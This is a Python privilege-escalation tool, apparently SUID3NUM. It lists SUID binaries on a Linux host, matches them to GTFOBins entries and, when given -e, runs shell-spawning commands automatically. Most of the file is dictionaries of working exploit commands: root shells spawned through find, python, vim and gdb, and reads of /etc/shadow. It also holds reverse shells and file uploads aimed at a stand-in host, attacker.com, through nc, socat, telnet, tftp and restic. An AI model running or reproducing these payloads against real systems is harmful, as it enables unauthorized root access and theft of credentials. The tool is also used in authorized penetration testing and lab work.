#!/usr/bin/python3

"""
Works with both python2 & python3
"""

from sys import argv
from os import system, popen
from time import sleep

# The following list contains exploits for all known SUID binaries
customSUIDs = {
    'aria2c': 'COMMAND=\'id\'\nTF=$(mktemp)\necho "$COMMAND" > $TF\nchmod +x $TF\n./aria2c --on-download-error=$TF http://x',
    'arp': 'LFILE=file_to_read\n./arp -v -f "$LFILE"',
    'base32': 'LFILE=file_to_read\nbase32 "$LFILE" | base32 --decode',
    'base64': 'LFILE=file_to_read\n./base64 "$LFILE" | base64 --decode',
    'byebug': 'TF=$(mktemp)\necho \'system("/bin/sh")\' > $TF\n./byebug $TF\ncontinue',
    'chmod': 'LFILE=file_to_change\n./chmod 0777 $LFILE',
    'chown': 'LFILE=file_to_change\n./chown $(id -un):$(id -gn) $LFILE',
    'cp': 'LFILE=file_to_write\nTF=$(mktemp)\necho "DATA" > $TF\n./cp $TF $LFILE',
    'curl': 'URL=http://attacker.com/file_to_get\nLFILE=file_to_save\n./curl $URL -o $LFILE',
    'date': 'LFILE=file_to_read\n./date -f $LFILE',
    'dd': 'LFILE=file_to_write\necho "data" | ./dd of=$LFILE',
    'dialog': 'LFILE=file_to_read\n./dialog --textbox "$LFILE" 0 0',
    'diff': 'LFILE=file_to_read\n./diff --line-format=%L /dev/null $LFILE',
    'dmsetup': "./dmsetup create base <<EOF\n0 3534848 linear /dev/loop0 94208\nEOF\n./dmsetup ls --exec '/bin/sh -p -s'", 'file': 'LFILE=file_to_read\n./file -m $LFILE',
    'ed': './ed\n!/bin/sh',
    'eqn': 'LFILE=file_to_read\n./eqn "$LFILE"',
    'fmt': 'LFILE=file_to_read\n./fmt -pNON_EXISTING_PREFIX "$LFILE"',
    'git': 'PAGER=\'sh -c "exec sh 0<&1"\' ./git -p help',
    'gtester': 'TF=$(mktemp)\necho \'#!/bin/sh -p\' > $TF\necho \'exec /bin/sh -p 0<&1\' >> $TF\nchmod +x $TF\ngtester -q $TF',
    'hd': 'LFILE=file_to_read\n./hd "$LFILE"',
    'hexdump': 'LFILE=file_to_read\n./hexdump -C "$LFILE"',
    'highlight': 'LFILE=file_to_read\n./highlight --no-doc --failsafe "$LFILE"',
    'iconv': 'LFILE=file_to_read\n./iconv -f 8859_1 -t 8859_1 "$LFILE"',
    'iftop': './iftop\n!/bin/sh',
    'ip': 'LFILE=file_to_read\n./ip -force -batch "$LFILE"',
    'jjs': 'echo "Java.type(\'java.lang.Runtime\').getRuntime().exec(\'/bin/sh -pc \\$@|sh\\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)\').waitFor()" | ./jjs',
    'jq': 'LFILE=file_to_read\n./jq -Rr . "$LFILE"',
    'ksshell': 'LFILE=file_to_read\n./ksshell -i $LFILE',
    'ldconfig': 'TF=$(mktemp -d)\necho "$TF" > "$TF/conf"\n# move malicious libraries in $TF\n./ldconfig -f "$TF/conf"',
    'look': 'LFILE=file_to_read\n./look \'\' "$LFILE"',
    'lwp-download': 'URL=http://attacker.com/file_to_get\nLFILE=file_to_save\n./lwp-download $URL $LFILE',
    'lwp-request': 'LFILE=file_to_read\n./lwp-request "file://$LFILE"',
    'mv': 'LFILE=file_to_write\nTF=$(mktemp)\necho "DATA" > $TF\n./mv $TF $LFILE',
    'mysql': "./mysql -e '\\! /bin/sh'", 'awk': './awk \'BEGIN {system("/bin/sh")}\'',
    'nano': './nano\n^R^X\nreset; sh 1>&0 2>&0',
    'nawk': './nawk \'BEGIN {system("/bin/sh")}\'',
    'nc': 'RHOST=attacker.com\nRPORT=12345\n./nc -e /bin/sh $RHOST $RPORT',
    'nmap': 'TF=$(mktemp)\necho \'os.execute("/bin/sh")\' > $TF\n./nmap --script=$TF',
    'nohup': 'nohup /bin/sh -p -c "sh -p <$(tty) >$(tty) 2>$(tty)"',
    'openssl': 'openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345\n',
    'pic': './pic -U\n.PS\nsh X sh X',
    'pico': './pico\n^R^X\nreset; sh 1>&0 2>&0',
    'pry': './pry\nsystem("/bin/sh")',
    'readelf': 'LFILE=file_to_read\n./readelf -a @$LFILE',
    'restic': 'RHOST=attacker.com\nRPORT=12345\nLFILE=file_or_dir_to_get\nNAME=backup_name\n./restic backup -r "rest:http://$RHOST:$RPORT/$NAME" "$LFILE"',
    'scp': 'TF=$(mktemp)\necho \'sh 0<&2 1>&2\' > $TF\nchmod +x "$TF"\n./scp -S $TF a b:',
    'shuf': 'LFILE=file_to_write\n./shuf -e DATA -o "$LFILE"\nsudo:',
    'soelim': 'LFILE=file_to_read\n./soelim "$LFILE"',
    'sqlite3': "./sqlite3 /dev/null '.shell /bin/sh'", 'socat': 'RHOST=attacker.com\nRPORT=12345\n./socat tcp-connect:$RHOST:$RPORT exec:sh,pty,stderr,setsid,sigint,sane',
    'strings': 'LFILE=file_to_read\n./strings "$LFILE"',
    'sysctl': 'LFILE=file_to_read\n./sysctl -n "/../../$LFILE"',
    'systemctl': 'TF=$(mktemp).service\necho \'[Service]\nType=oneshot\nExecStart=/bin/sh -c "id > /tmp/output"\n[Install]\nWantedBy=multi-user.target\' > $TF\n./systemctl link $TF\n./systemctl enable --now $TF',
    'tac': 'LFILE=file_to_read\n./tac -s \'PromiseWontOverWrite\' "$LFILE"',
    'tar': './tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh',
    'tee': 'LFILE=file_to_write\necho DATA | ./tee -a "$LFILE"',
    'telnet': 'RHOST=attacker.com\nRPORT=12345\n./telnet $RHOST $RPORT\n^]\n!/bin/sh',
    'tftp': 'RHOST=attacker.com\n./tftp $RHOST\nput file_to_send',
    'uudecode': 'LFILE=file_to_read\nuuencode "$LFILE" /dev/stdout | uudecode',
    'uuencode': 'LFILE=file_to_read\nuuencode "$LFILE" /dev/stdout | uudecode',
    'xz': 'LFILE=file_to_read\n./xz -c "$LFILE" | xz -d',
    'zip': "TF=$(mktemp -u)\n./zip $TF /etc/hosts -T -TT 'sh #'\nsudo rm $TF", 'wget': 'export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\n./wget $URL -O $LFILE',
    'zsoelim': 'LFILE=file_to_read\n./zsoelim "$LFILE"',
}

# The following list contains all default SUID bins found within Unix
defSUIDBinaries = [
    "arping",
    "at",
    "bwrap",
    "chfn",
    "chrome-sandbox",
    "chsh",
    "dbus-daemon-launch-helper",
    "dmcrypt-get-device",
    "exim4",
    "fusermount",
    "gpasswd",
    "helper",
    "kismet_capture",
    "lxc-user-nic",
    "mount",
    "mount.cifs",
    "mount.ecryptfs_private",
    "mount.nfs",
    "newgidmap",
    "newgrp",
    "newuidmap",
    "ntfs-3g",
    "passwd",
    "ping",
    "ping6",
    "pkexec",
    "polkit-agent-helper-1",
    "pppd",
    "snap-confine",
    "ssh-keysign",
    "su",
    "sudo",
    "traceroute6.iputils",
    "ubuntu-core-launcher",
    "umount",
    "VBoxHeadless",
    "VBoxNetAdpCtl",
    "VBoxNetDHCP",
    "VBoxNetNAT",
    "VBoxSDL",
    "VBoxVolInfo",
    "VirtualBoxVM",
    "vmware-authd",
    "vmware-user-suid-wrapper",
    "vmware-vmx",
    "vmware-vmx-debug",
    "vmware-vmx-stats",
    "Xorg.wrap",
]


# Auto Exploitation of SUID Bins - List
suidExploitation = {
    'ash': '',
    'bash': '-p',
    'busybox': 'sh',
    'cat': '/etc/shadow',
    'chroot': '/ /bin/sh -p',
    'csh': '-b',
    'cut': '-d "" -f1 /etc/shadow',
    'dash': '-p',
    'docker': 'run -v /:/mnt --rm -it alpine chroot /mnt sh',
    'emacs': '-Q -nw --eval \'(term "/bin/sh -p")\'',
    'env': '/bin/sh -p',
    'expand': '/etc/shadow',
    'expect': '-c "spawn /bin/sh -p;interact"',
    'find': '. -exec /bin/sh -p \\; -quit',
    'flock': '-u / /bin/sh -p',
    'fold': '-w99999999 /etc/shadow',
    'gawk': '\'BEGIN {system("/bin/sh")}\'',
    'gdb': '-q -nx -ex \'python import os; os.execl("/bin/sh", "sh", "-p")\' -ex quit',
    'gimp': '-idf --batch-interpreter=python-fu-eval -b \'import os; os.execl("/bin/sh", "sh", "-p")\'',
    'grep': '"" /etc/shadow',
    'head': '-c2G /etc/shadow',
    'ionice': '/bin/sh -p',
    'jrunscript': '-e "exec(\'/bin/sh -pc \\$@|sh\\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)\')"',
    'ksh': '-p',
    'ld.so': '/bin/sh -p',
    'less': '/etc/shadow',
    'logsave': '/dev/null /bin/sh -i -p',
    'lua': '-e \'os.execute("/bin/sh")\'',
    'make': '-s --eval=$\'x:\\n\\t-\'"/bin/sh -p"',
    'mawk': '\'BEGIN {system("/bin/sh")}\'',
    'more': '/etc/shadow',
    'nice': '/bin/sh -p',
    'nl': '-bn -w1 -s \'\' /etc/shadow',
    'node': 'node -e \'require("child_process").spawn("/bin/sh", ["-p"], {stdio: [0, 1, 2]});\'',
    'od': 'od -An -c -w9999 /etc/shadow | sed -E -e \'s/ //g\' -e \'s/\\\\n/\\n/g\'',
    'perl': '-e \'exec "/bin/sh";\'',
    'pg': '/etc/shadow',
    'php': '-r "pcntl_exec(\'/bin/sh\', [\'-p\']);"',
    'python': '-c \'import os; os.execl("/bin/sh", "sh", "-p")\'',
    'rlwrap': '-H /dev/null /bin/sh -p',
    'rpm': '--eval \'%{lua:os.execute("/bin/sh", "-p")}\'',
    'rpmquery': '--eval \'%{lua:posix.exec("/bin/sh", "-p")}\'',
    'rsync': '-e \'sh -p -c "sh 0<&2 1>&2"\' 127.0.0.1:/dev/null',
    'run-parts': '--new-session --regex \'^sh$\' /bin --arg=\'-p\'',
    'rvim': '-c \':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")\'',
    'sed': '-e "" /etc/shadow',
    'setarch': '$(arch) /bin/sh -p',
    'sh': '-p',
    'sort': '-m /etc/shadow',
    'start-stop-daemon': '-n $RANDOM -S -x /bin/sh -- -p',
    'stdbuf': '-i0 /bin/sh -p',
    'strace': '-o /dev/null /bin/sh -p',
    'tail': '-c2G /etc/shadow',
    'taskset': '1 /bin/sh -p',
    'time': '/bin/sh -p',
    'timeout': '7d /bin/sh -p',
    'ul': '/etc/shadow',
    'unexpand': 'unexpand -t99999999 /etc/shadow',
    'uniq': '/etc/shadow',
    'unshare': '-r /bin/sh',
    'vim': '-c \':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")\'',
    'watch': '-x sh -c \'reset; exec sh 1>&0 2>&0\'',
    'xargs': '-a /dev/null sh -p',
    'xxd': '/etc/shadow | xxd -r',
    'zsh': '',
}


# The following list contains GTFO Bins binaries which are SUID exploitable
gtfoBinsList = [
    "bash",
    "busybox",
    "cat",
    "chroot",
    "cut",
    "dash",
    "docker",
    "env",
    "expand",
    "expect",
    "find",
    "flock",
    "fold",
    "gdb",
    "grep",
    "head",
    "ionice",
    "jrunscript",
    "ksh",
    "ld.so",
    "less",
    "logsave",
    "make",
    "more",
    "nice",
    "nl",
    "node",
    "od",
    "perl",
    "pg",
    "php",
    "python",
    "rlwrap",
    "rpm",
    "rpmquery",
    "rsync",
    "run-parts",
    "rvim",
    "sed",
    "setarch",
    "sort",
    "start-stop-daemon",
    "stdbuf",
    "strace",
    "tail",
    "taskset",
    "time",
    "timeout",
    "ul",
    "unexpand",
    "uniq",
    "unshare",
    "vim",
    "watch",
    "xargs",
    "xxd",
    "zsh",
    "aria2c",
    "arp",
    "ash",
    "base32",
    "base64",
    "byebug",
    "chmod",
    "chown",
    "cp",
    "csh",
    "curl",
    "date",
    "dd",
    "dialog",
    "diff",
    "dmsetup",
    "file",
    "ed",
    "emacs",
    "eqn",
    "fmt",
    "gawk",
    "gimp",
    "git",
    "gtester",
    "hd",
    "hexdump",
    "highlight",
    "iconv",
    "iftop",
    "ip",
    "jjs",
    "jq",
    "ksshell",
    "ldconfig",
    "look",
    "lua",
    "lwp-download",
    "lwp-request",
    "mawk",
    "mv",
    "mysql",
    "awk",
    "nano",
    "nawk",
    "nc",
    "nmap",
    "nohup",
    "openssl",
    "pic",
    "pico",
    "pry",
    "readelf",
    "restic",
    "scp",
    "shuf",
    "sh",
    "soelim",
    "sqlite3",
    "socat",
    "strings",
    "sysctl",
    "systemctl",
    "tac",
    "tar",
    "tclsh",
    "tee",
    "telnet",
    "tftp",
    "uudecode",
    "uuencode",
    "xz",
    "zip",
    "wget",
    "zsoelim",
]


"""
Colors List
"""

CYAN    = "\033[0;96m"
GREEN   = "\033[0;92m"
WHITE   = "\033[0;97m"
RED     = "\033[0;91m"
BLUE    = "\033[0;94m"
YELLOW  = "\033[0;33m"
MAGENTA = "\033[0;35m"

BARLINE = "------------------------------"

BANNER  = MAGENTA + "  ___ _   _ _ ___    _____  _ _   _ __  __ \n"
BANNER  += YELLOW + " / __| | | / |   \\  |__ / \\| | | | |  \\/  |\n"
BANNER  += BLUE + " \\__ \\ |_| | | |) |  |_ \\ .` | |_| | |\\/| |\n"
BANNER  += RED + " |___/\\___/|_|___/  |___/_|\\_|\\___/|_|  |_| " + CYAN + " twitter@syed__umar\n"


def list_all_suid_binaries():
    """
    Find the SUID binaries and return the list
    """

    print(WHITE + "[" + BLUE + "#" + WHITE + "] " + YELLOW + "Finding/Listing all SUID Binaries ..")
    print(WHITE + BARLINE)

    command     = "find / -perm -4000 -type f 2>/dev/null"
    result      = popen(command).read().strip().split("\n")

    for bins in result:
        print(YELLOW + bins)

    print(WHITE + BARLINE + "\n\n")
    return(result)


def check_suids_in_gtfo(suid_bins):
    """
    This function prints the following data:
        - Default binaries which ship with installation of linux
        - Custom binaries which aren't part of default list
        - Binaries which match GTFObins list!

    Args:
        suid_bins ([list]): SUID binaries list

    Returns:
        bins_in_gtfo, default_suid_bins, custom_suid_bins
    """

    bins_in_gtfo      = []
    custom_suid_bins  = []
    default_suid_bins = []

    for bins in suid_bins:
        bin_name = bins.split("/")[::-1][0]

        if bin_name not in defSUIDBinaries:
            custom_suid_bins.append(bins)

            if bin_name in gtfoBinsList:
                bins_in_gtfo.append(bins)

        else:
            default_suid_bins.append(bins)

    print(WHITE + "["+ RED + "!" + WHITE + "] Default Binaries (Don't bother)")

    print(BARLINE)
    for bins in default_suid_bins:
        print(BLUE + bins)
    print(WHITE + BARLINE + "\n\n")

    print(WHITE + "[" + CYAN + "~" + WHITE + "] " + CYAN + "Custom SUID Binaries (Interesting Stuff)")

    print(WHITE + BARLINE)
    for bins in custom_suid_bins:
        print(CYAN + bins)
    print(WHITE + BARLINE + "\n\n")

    if len(bins_in_gtfo) != 0:
        print("[" + GREEN + "#" + WHITE + "] " + GREEN + "SUID Binaries in GTFO bins list (Hell Yeah!)")
        print(WHITE + BARLINE)

        for binaries in bins_in_gtfo:
            path_of_bin   = popen("which " + binaries).read().strip()
            gtfo_url     = "https://gtfobins.github.io/gtfobins/" + binaries[::-1].split("/")[0][::-1] + "/#suid"
            print(GREEN + path_of_bin + WHITE + " -~> " + MAGENTA + gtfo_url)

        print(WHITE + BARLINE + "\n\n")

    else:
        print("[" + GREEN + "#" + WHITE + "] " + GREEN + "SUID Binaries found in GTFO bins..")
        print(WHITE + BARLINE)

        print("[" + RED + "!" + WHITE + "] " + MAGENTA + "None " + RED + ":(")
        print(WHITE + BARLINE + "\n\n")


    bins_to_exploit = {}

    for binary in bins_in_gtfo:
        binary_name = binary[::-1].split("/")[0][::-1]

        if binary_name not in suidExploitation:
            bins_to_exploit[binary] = customSUIDs[binary_name]


    if len(bins_to_exploit) != 0:
        print("[" + YELLOW + "&" + WHITE + "] " + CYAN + "Manual Exploitation (Binaries which create files on the system)")
        print(WHITE + BARLINE)

        for binary_path, binary_exploitation in bins_to_exploit.items():
            binary_name             = binary_path[::-1].split("/")[0][::-1]
            binary_exploitation     = binary_exploitation.replace(binary_name, binary_path).replace("./", "")

            print(WHITE + "[" + CYAN + "&" + WHITE + "] " + MAGENTA + binary_name.capitalize() + WHITE + " ( " + GREEN + binary_path + " )" + WHITE)
            print(YELLOW + binary_exploitation + WHITE + "\n")

        print(WHITE + BARLINE + "\n\n")

    return(bins_in_gtfo, default_suid_bins, custom_suid_bins)


def exploit_enumerated_suids(bins):
    """Exploits the enumerated binaries

    Params:
        -e  -> auto-exploit

    Args:
        bins ([list]): Vulnerable SUID binaries
    """
    commands     = []

    for suid_bins in bins:
        _bin     = suid_bins.split("/")[::-1][0]

        if _bin in suidExploitation:
            _results = suid_bins + " " + suidExploitation[_bin]
            commands.append(_results)

    if len(commands) != 0:
        if len(argv) == 2:
            if argv[1] == '-e':
                print(WHITE + "[" + MAGENTA + "$" + WHITE + "] " + WHITE + "Auto Exploiting SUID bit binaries !!!")
                print(WHITE + BARLINE)

                for _commands in commands:
                    print(MAGENTA + "\n[#] Executing Command .. ")
                    print(CYAN + "[~] " + _commands + "\n" + WHITE)
                    sleep(0.5)
                    system(_commands)
                    sleep(0.5)

        else:
            print(WHITE + "[" + GREEN + "$" + WHITE + "] " + WHITE + "Please try the command(s) below to exploit harmless SUID bin(s) found !!!")
            print(WHITE + BARLINE)

            for _commands in commands:
                print("[~] " + _commands)

        print(WHITE + BARLINE + "\n\n")


def main():
    """
    1. List SUIDs
    2. Check all SUIDs enumerated in GTFO bins list
    3. Print exploitation commands
    4. Exploit those enumerated SUIDs (if user specifies: -e)
    """

    print(BANNER)

    try:
        suid_bins = list_all_suid_binaries()
        gtfo_bins = check_suids_in_gtfo(suid_bins)
        exploit_enumerated_suids(gtfo_bins[0])

    except KeyboardInterrupt:
        print("\n[" + RED + "!" + WHITE + "] " + RED + "Aye, why you do dis!?")


if __name__ == '__main__':
    main()
